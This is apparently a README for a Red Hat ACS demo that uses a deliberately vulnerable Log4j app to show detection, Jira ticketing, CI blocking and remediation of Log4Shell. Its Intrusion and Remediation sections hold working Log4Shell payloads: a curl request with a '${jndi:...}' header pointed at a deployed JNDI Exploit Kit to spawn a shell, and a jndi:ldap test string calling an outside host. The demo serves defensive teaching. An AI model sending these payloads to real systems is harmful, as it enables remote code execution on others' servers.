# Red Hat ACS demo

This repository is a demo for Red Hat Advanced Cluster Security that shows its benefits in the context of a major vulnerability such as Log4Shell.

The high level scenario of the demo is:

* An application is vulnerable to Log4Shell and deployed to production
* The vulnerability is announced
* A policy is loaded to track vulnerable applications and drive the remediation process
* Tickets are opened automatically on Jira to notify developers
* However, the developers need time to properly update the Log4j library
* The operations people will implement the remediation in the meantime
* The developers will notice their CI process is stopped because of the critical vulnerability
* They update the version of the Log4j dependency
* The CI/CD process builds and deploy the final fix for the CVE

From this demo we can conclude that Red Hat ACS can:

* Detect major CVEs when they appear
* Drive a remediation campaign
* Identify the current version of each component of a container image
* Detect intrusion in the information system
* Warn developers that their application is vulnerable to a CVE
* Ensure security and quality of software delivery

## Setup

### 0. Verify pre-requisites

On your workstation:

* podman
* buildah
* git
* curl
* oc
* ansible

On your OpenShift cluster(s):

* Red Hat ACS
* OpenShift Pipelines

Create three namespaces for the demo.

```sh
oc new-project vulnerable-cicd
oc new-project vulnerable-log4j
oc new-project exploitkit-log4j
```

### 1. Jira

* Create a Jira trial account at: https://www.atlassian.com/fr/try/cloud/signup?bundle=jira-software&edition=free
* Write down the URL of your dashboard.
* Click **Jira Software** in the top left corner
* Click **See all projects** in the top right corner
* Click **Create project**
* Select the **Bug tracking** template
* Choose a name and a key
* Write down the chosen key
* Go to https://id.atlassian.com/manage-profile/security/api-tokens and create an API Token.
* Login to the Central and drill down to **Platform configuration** > **Integrations**.
* Select **Jira software**.
* Click **New integration**.
* Fill-in the creation form with:

  * **Integration Name**: `Jira`
  * **Username**: your Jira username
  * **Password**: your Jira API Token
  * **Issue Type**: `Task`
  * **Default Project**: your Jira project Key (all upper case)

* Click **Test** and **Save**

Save the Jira API key to the Ansible Vault:

```sh
ansible-vault create cleanup/ansible-vault.yaml
```

Seize the opportunity to also add your Central admin password and hostname.

```yaml
jira_password: foo
central_admin_password: bar
central_hostname: foo.bar
```

### 2. Expose the registry

Expose the OpenShift registry.

```sh
oc create route reencrypt image-registry --service=image-registry -n openshift-image-registry
REGISTRY=$(oc get route -n openshift-image-registry image-registry -o jsonpath={.spec.host})
```

Set the registry hostname where required.

```sh
sed -i.bak "s/__REGISTRY__/$REGISTRY/" remediation/Dockerfile deployment/kustomization.yaml cicd/80-pipeline.yaml
```

### 3. Deploy the CI/CD pipeline

Deploy the CI/CD pipeline.

```sh
oc apply -f cicd
```

Let podman push remediated images.

```sh
oc adm policy add-role-to-user admin -z default -n vulnerable-cicd
```

Open the Central and:

* Drill down to **Platform configuration** > **Integration**.
* Select **API Token**.
* Click **Generate token**.
* Fill-in the **Token name** with **Tekton**.
* Select the **Role** `Continuous Integration`.
* Click **Generate**.
* Write down the generated token.

Create a Kubernetes secret with this token:

```sh
oc create secret generic central-apitoken -n vulnerable-cicd --from-literal=rox_api_token=<TOKEN> --from-literal=rox_central_endpoint=central-stackrox.apps.$CLUSTER_DOMAIN_NAME:443
```

Get the registry hostname and default token.

```sh
# Get the hostname...
oc get route -n openshift-image-registry image-registry -o jsonpath={.spec.host}

# and the password.
oc serviceaccounts get-token -n vulnerable-cicd default
```

Create the Docker Registry integration in Central with the above information.

Add an enforcement exception for the `Fixable Severity at least important` policy:

* Drill down to **Platform configuration** > **System policy**
* Select the policy `Fixable Severity at least important`
* Click **Edit**
* In the excluded image, add `<REGISTRY>/vulnerable-cicd/vulnerable-log4j` (you will have to select the last option of the list: `Create ...`)
* Save the policy

### 4. Prepare for deployment

Give access to the `vulnerable-cicd` images from the `vulnerable-log4j` namespace.

```sh
oc get secrets -n vulnerable-cicd -o json | jq -r '.items[] | select(.metadata.annotations["kubernetes.io/service-account.name"]=="default" and .type=="kubernetes.io/dockercfg") | .data[".dockercfg"]' | base64 -d | jq --arg registry "$REGISTRY" '.["image-registry.openshift-image-registry.svc:5000"] as $conf | { ($registry) : $conf}' > dockercfg
oc apply -n vulnerable-log4j -f - <<EOF
kind: Secret
apiVersion: v1
metadata:
  name: external-registry
data:
  .dockercfg: $(base64 -w0 dockercfg)
type: kubernetes.io/dockercfg
EOF
oc secrets link default external-registry --for=pull -n vulnerable-log4j
```

### 5. Deploy the Exploit

Deploy the JNDI Exploit Kit.

```sh
oc apply -f exploit/deployment
```

## Preparation

From your workstation, verify the connection to the registry:

```sh
REGISTRY=$(oc get route -n openshift-image-registry image-registry -o jsonpath={.spec.host})
REGISTRY_TOKEN="$(oc get secrets -n vulnerable-cicd -o json | jq -r '.items[] | select(.metadata.annotations["kubernetes.io/service-account.name"]=="default" and .type=="kubernetes.io/dockercfg") | .data[".dockercfg"]' | base64 -d | jq -r --arg registry "$REGISTRY" '.["image-registry.openshift-image-registry.svc:5000"].password')"
podman login "$REGISTRY" --username sa --password "$REGISTRY_TOKEN"
```

Run the cleanup script.

```sh
ansible-playbook cleanup/cleanup.yaml
```

Deploy the vulnerable app.

```sh
oc kustomize deployment | oc apply -f -
```

## Demo scenario

### Build the inventory

* Open the Central
* Drill down to **Platform Configuration** > **System policies**
* Click **Import policy**
* Load `policy/log4shell.json`
* Open the **Violations** tab
* Filter by **Policy**: `Log4Shell`

### Intrusion

In a hidden terminal, run the JNDI Exploit Kit to trigger the "Shell spawned by Java application" policy

* Get the RMI URL with:

  ```sh
  oc logs -n exploitkit-log4j deploy/jndi-exploit-kit |grep -A1 "BYPASS WITH EL by @welk1n"
  EXPLOIT_URL="$(oc logs -n exploitkit-log4j deploy/jndi-exploit-kit | grep -A1 "BYPASS WITH EL by @welk1n" | grep rmi:// | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g')"
  ```

* Find the URL of the vulnerable container.

  ```sh
  export TARGET="https://$(oc get route settlement-app -n vulnerable-log4j -o jsonpath="{.spec.host}")/"
  ```

* Send the exploit

  ```sh
  curl "$TARGET" -H "X-Name: \${jndi:$EXPLOIT_URL}"
  ```

Then, show the violation:

* Open the **Violations** tab
* Filter by **Namespace**: `vulnerable-log4j`
* Go to the OpenShift console
* Select the `vulnerable-log4j` namespace
* Delete the pod
* In the Central, clear the Violation
* Drill down to **Platform Configuration** > **System policies**
* Open the **Shell Spawned by Java Application** policy
* Click the **Edit** button
* On the fourth tab, show the automatic enforcement options

### Remediation

```sh
podman build --pull-always -t $REGISTRY/vulnerable-cicd/vulnerable-log4j:latest remediation
podman run -it --rm --name test -p 8080:8080 $REGISTRY/vulnerable-cicd/vulnerable-log4j:latest
curl http://localhost:8080 -H 'X-Name: ${jndi:ldap://log4shell.huntress.com:1389/e597d75d-1851-4133-9a08-d5dfd7e04264}'
podman push $REGISTRY/vulnerable-cicd/vulnerable-log4j:latest
oc delete pods -l deployment=settlement-app -n vulnerable-log4j
```

The violation "Log4Shell" disappeared.

### Final fix by the developers

Start the CI/CD pipeline:

* In the OpenShift developer console, navigate to the `vulnerable-cicd` namespace.
* Drill down to **Pipelines**
* Select `vulnerable-log4j`
* Click **Actions** > **Start**

It fails because the current version is vulnerable.

Edit **src/pom.xml** and change `<log4j.version>2.14.0</log4j.version>` to `<log4j.version>2.17.1</log4j.version>`.

```sh
git add src/pom.xml
git commit -m 'fix log4shell cve'
git push
```

Restart the CI/CD pipeline.

## Reset the demo

In Jira, mark all tickets as closed.

Edit **src/pom.xml** and change `<log4j.version>2.17.1</log4j.version>` to `<log4j.version>2.14.0</log4j.version>`.

```sh
git add src/pom.xml
git commit -m 'reset the demo'
git push
```

Cleanup

```sh
oc kustomize deployment | oc delete -f -
oc delete pods,builds,pipelineruns -n vulnerable-cicd --all
oc start-build vulnerable-log4j -n vulnerable-cicd
```
